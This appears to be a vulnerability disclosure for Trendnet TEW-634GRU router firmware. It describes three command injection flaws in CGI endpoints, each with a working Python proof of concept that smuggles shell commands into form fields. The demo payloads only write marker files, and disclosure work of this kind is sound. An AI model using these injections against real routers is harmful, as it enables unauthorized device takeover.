# TEW-634

Exploit Author: yangchunyu@whu.edu.cn

Vendor: Trendnet

Firmware: TEW-634GRU_1.0R

There are three command injection vulnerabilities in this firmware vulnerability, and the vulnerabilities exist in the /sbin/httpd binary file of the firmware sample.

# system_time.cgi
The first command injection occurred in the "date" parameter of http://ip/system_time.cgi, as shown in the following figure.

![image](https://github.com/WhereisRain/TEW-634/blob/main/date.png)

# poc1
```
import requests

ip = "http://192.168.10.1/"

url = ip + 'system_time.cgi'

command = "20250523; echo 1 > /tmp/hello1"

payload = {
    "date": command,
    
    "html_response_return_page": "static_routing.asp",
}

r = requests.post(url, data=payload)

print(r.headers)

print(r.text)
```
# dns_query.cgi
The second command injection occurred in the "dns_query_name" parameter of http://ip/dns_query.cgi, as shown in the following figure.

![image](https://github.com/WhereisRain/TEW-634/blob/main/dns_query_name.png)

# poc2
import requests

ip = "http://192.168.10.1/"

url = ip + 'dns_query.cgi'

command = "a;echo 2 > /tmp/hello2;"

payload = {

    "html_response_page": "back.asp",
    
    "dns_query_name": command,
    
    "html_response_return_page": "st_routing.asp",
    
    "countdonw_time": '12',
}

r = requests.post(url, data=payload)

print(r.headers)

print(r.text)

# set_sta_enrollee_pin.cgi
The third command injection occurred in the "wps_sta_enrollee_pin" parameter of the URL http://ip/set_sta_enrollee_pin.cgi, as shown in the following figure.

![image](https://github.com/WhereisRain/TEW-634/blob/main/wps_sta_enrollee_pin.png)

# poc3
import requests

ip = "http://192.168.10.1/"

url = ip + 'set_sta_enrollee_pin.cgi'

command = "a;echo 3 > /tmp/hello3;"

payload = {

    "wps_sta_enrollee_pin": command,
    
    "html_response_page": "do_wps.asp",
    
    "html_response_return_page": "do_wps.asp",
}

r = requests.post(url, data=payload)

print(r.headers)

print(r.text)
